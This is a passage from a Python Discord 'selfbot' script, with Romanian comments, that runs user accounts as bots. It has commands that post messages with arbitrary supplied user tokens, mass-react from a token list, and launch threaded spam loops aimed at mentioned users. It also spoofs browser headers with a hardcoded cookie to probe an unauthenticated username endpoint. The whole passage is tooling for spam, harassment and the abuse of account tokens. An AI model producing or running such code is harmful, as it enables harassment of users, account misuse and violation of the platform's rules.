    else:   
        await ctx.send("# Token is invalid")

#checkusername
@client_pentru_glumite.command()
async def validateusername(ctx,username=None):
    url = "https://discord.com/api/v9/unique-username/username-attempt-unauthed" 
    headers = {
                "authority": "discord.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/json",
                "cookie": "__dcfduid=676e06b0565b11ed90f9d90136e0396b; __sdcfduid=676e06b1565b11ed90f9d90136e0396bc28dfd451bebab0345b0999e942886d8dfd7b90f193729042dd3b62e2b13812f; __cfruid=1cefec7e9c504b453c3f7111ebc4940c5a92dd08-1666918609; locale=en-US",
                "origin": "https://discord.com",
                "pragma": "no-cache",
                "referer": "https://discord.com/channels/@me",
                "sec-ch-ua": f'"Google Chrome";v="115", "Chromium";v="115", "Not=A?Brand";v="24"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-discord-locale": "en-US",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlcGVhc2VfY2hhbm5lcCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE1NDc1MCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=",
            }
    jsondata = {
        "username": username
    }
    req = requests.post(url, headers=headers, json=jsondata)
    json = req.json()
    if json['taken'] == True:
        await ctx.send("# Username is taken ❌")
    else:
        await ctx.send("# Username is not taken ✅")

#saytoken
@client_pentru_glumite.command()
async def saytoken(ctx, toscan=None, *, mesaj123=None):
    toscan = str(toscan)
    response = new_main_token_validation(toscan)
    if not response:
        await ctx.send("# Token is invalid")
        return
    mesaj123 = str(mesaj123)
    canal = f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
    headers={"authorization":toscan}
    await ctx.message.delete()
    requests.post(canal
                  ,headers=headers
                  ,json={"content":mesaj123})

#saytokenid
@client_pentru_glumite.command()
async def saytokenid(ctx, toscan=None, idcanal = None, *, mesaj123=None):
    idcanal = int(idcanal)
    toscan = str(toscan)
    response = new_main_token_validation(toscan)
    if not response:
        await ctx.send("# Token is invalid")
        return
    mesaj123 = str(mesaj123)
    canal = f'https://discord.com/api/v10/channels/{idcanal}/messages'
    headers={"authorization":toscan}
    await ctx.message.delete()
    requests.post(canal
                  ,headers=headers
                  ,json={"content":mesaj123})
#reactall
@client_pentru_glumite.command()
async def reactall(ctx,channelid=None,messageid=None,emoji=None):
    channelid = int(channelid)
    messageid = int(messageid)
    emoji = str(emoji)
    await ctx.message.delete()
    for i in tokensreact:
     headers = {"Authorization":i}
     try:
      r = requests.put(f"https://discord.com/api/v9/channels/{channelid}/messages/{messageid}/reactions/{emoji}/@me", headers=headers)
      time.sleep(0.2)
     except Exception as e:
      pass

#userid
@client_pentru_glumite.command()
async def userid(ctx, id=None):
    id = int(id)
    headers = {
        'Authorization': token,
    }
    response = requests.get(f'https://discord.com/api/v10/users/{id}', headers=headers)
    if response.status_code == 200:
        user_data = response.json()
        username = user_data['username']
        await ctx.send(f"# Username is: {username}")
    else:
        await ctx.send(f"# An error occured.")

#av
@client_single_line_spam.command()
async def av(ctx, user_mention: discord.User):
    await ctx.send(f"{user_mention.avatar_url}")

# banner
@client_single_line_spam.command()
async def banner(ctx, user:discord.User):
    try:
     if user == None:
        user = ctx.author
     req = await client_single_line_spam.http.request(discord.http.Route("GET", "/users/{uid}", uid=user.id))
     banner_id = req["banner"]
     # If statement because the user may not have a banner
     if banner_id:
         banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
         await ctx.send(f"{banner_url}")
     else:
         pass
    except Exception:
        # a murit mata daca ai ajuns aici
        pass
 
#serverbanner
@client_single_line_spam.command()
async def serverbanner(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"`server has no banner`")
        return
    await ctx.send(ctx.guild.banner_url) 

#serverav
@client_single_line_spam.command()
async def serverav(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"`server has no icon`")
        return
    await ctx.send(ctx.guild.icon_url)
    
# global start & stop commands

#globalstart
@client_pentru_globale.command()
async def globalstart(ctx,*user_mentions:discord.User):
    tokens3[1] = True
    tokens4[1] = True
    tokens6[1] = True
    await ctx.message.delete()
    thred2 = threading.Thread(target=send_with_retry_startall4
                              ,args=(ctx,user_mentions)
                              ,daemon=True)
    thred3 = threading.Thread(target=send_with_retry_startall2
                              ,args=(ctx,user_mentions)
                              ,daemon=True)
    thred4 = threading.Thread(target=send_with_retry_startall
                              ,args=(ctx,user_mentions)
                              ,daemon=True)
    thred2.start()
    thred3.start()
    thred4.start()

#globalstop
@client_pentru_globale.command()
async def globalstop(ctx):
    tokens3[1] = False
    tokens4[1] = False
    tokens6[1] = False
    await ctx.message.delete()  

#globaltyping
@client_pentru_globale.command()
async def globaltyping(ctx, choice=None):
    await ctx.message.delete()
    optiuni = ["true","TRUE","True","false","FALSE","False"]
    optiuniadv = ["true","TRUE","True",]
    optiunineadv = ["false","FALSE","False"]
    if choice not in optiuni:
     requests.post(f'https://discord.com/api/v10/channels/{ctx.channel.id}/messages'
                   ,headers={"authorization":token}
                   ,json={"content":"# `Invalid parameter, value must be equal to False or True `"})
     return
    if choice in optiuniadv:
     tokensglobaltyping[0] = True
    elif choice in optiunineadv:
     tokensglobaltyping[0] = False
        
# initialize streaming script

youtube_link = "https://www.youtube.com/watch?v=Q7T01i-tgos"
default_stream_text = "solitude"
intents = discord.Intents.default()
intents.presences = True 

@client_streaming.command()
async def stream(ctx, *, stream_text):
    await client_streaming.change_presence(activity=discord.Streaming(name=stream_text
                                           , url=youtube_link)
                                           , status=discord.Status.dnd)
    await ctx.message.delete()

#streamtoken command logic

async def start_bot(token,text1):
    bot = commands.Bot(command_prefix=']')
    youtube_link = "https://www.youtube.com/watch?v=Q7T01i-tgos"
    intents = discord.Intents.default()
    intents.presences = True 
    @bot.event
    async def on_ready():
     await bot.change_presence(activity=discord.Streaming(name=text1
                               , url=youtube_link)
                               , status=discord.Status.dnd)
    await bot.start(token, bot=False)

async def run_bots(tochenut,text1):
    tasks = []
    tasks.append(asyncio.create_task(start_bot(tochenut,text1)))
    await asyncio.gather(*tasks)

# streamall command logic

async def strtbot(tochennnn,strimtext):
    bot25 = commands.Bot(command_prefix=']')
    youtube_link = "https://www.youtube.com/watch?v=Q7T01i-tgos"
    intents = discord.Intents.default()
    intents.presences = True 
    @bot25.event
    async def on_ready():
     await bot25.change_presence(activity=discord.Streaming(name=strimtext
                                 , url=youtube_link)
                                 , status=discord.Status.dnd)
    await bot25.start(tochennnn, bot=False)

async def strmall(strimtext):
    tasks223 = []
    for tochennnn in tokenstreams:
        if tochennnn == tokenstreams[0]:
            continue
        tasks223.append(asyncio.create_task(strtbot(tochennnn,strimtext)))
    await asyncio.gather(*tasks223)

# prepare clients to be ran

def run_single_line_spam(t,tolcenken):
    client_single_line_spam.run(tolcenken, bot=False)   
def run_multi_line_spam(t,tolcenken):
    client_multi_line_spam.run(tolcenken, bot=False)
def run_repeated_message_spam(t,tolcenken):
    client_repeated_message_spam.run(tolcenken, bot=False)
def run_spiced_multi_line_spam(t,tolcenken):
    client_spiced_multi_line_spam.run(tolcenken, bot=False)
def run_glumite(t,tolcenken):
    client_pentru_glumite.run(tolcenken,bot=False)
def run_streaming(t,tolcenken):
    client_streaming.run(tolcenken,bot=False)
def run_globale(t,tolcenken):
    client_pentru_globale.run(tolcenken,bot=False)

# streaming command clients

def asyncio_run(tochenut,text1):
    asyncio.run(run_bots(tochenut,text1))
def mata_run(tolen,strimtext):
    asyncio.run(strmall(strimtext))

# initialize streamtoken command

@client_streaming.command()
async def streamtoken(ctx, count=None, *, text=None):
    count = int(count)
    if count == 1:
        return
    count -= 1
    asyncio_process = threading.Thread(target=asyncio_run
                                       ,args=(tokens[count],text)
                                       ,daemon=True)
    asyncio_process.start()
    await ctx.message.delete()

# initialize streamall command

@client_streaming.command()
async def streamall(ctx, *, strimtext=None):
    strimtext = str(strimtext)
    tolen = ""
    asyncio_process22 = threading.Thread(target=mata_run
                                         ,args=(tolen,strimtext)
                                         ,daemon=True)
    asyncio_process22.start()
    await ctx.message.delete()

# initialize all scripts and display menu

if __name__ == "__main__":
    print(fade.purplepink(loading))
    new_token = main_token_validation()
    clear_terminal_event()
    print(fade.fire(text))
    loop = asyncio.get_event_loop()

    async def main():
        await asyncio.gather(
            client_single_line_spam.start(new_token, bot=False),
            client_multi_line_spam.start(new_token, bot=False),
            client_pentru_glumite.start(new_token, bot=False),
            client_pentru_globale.start(new_token, bot=False),
            client_spiced_multi_line_spam.start(new_token, bot=False),
            client_repeated_message_spam.start(new_token, bot=False),
            client_streaming.start(new_token, bot=False)
        )

    loop.run_until_complete(main())
             
# script version [ ULTIMATE ]
# made by @walkxlls // @andreikx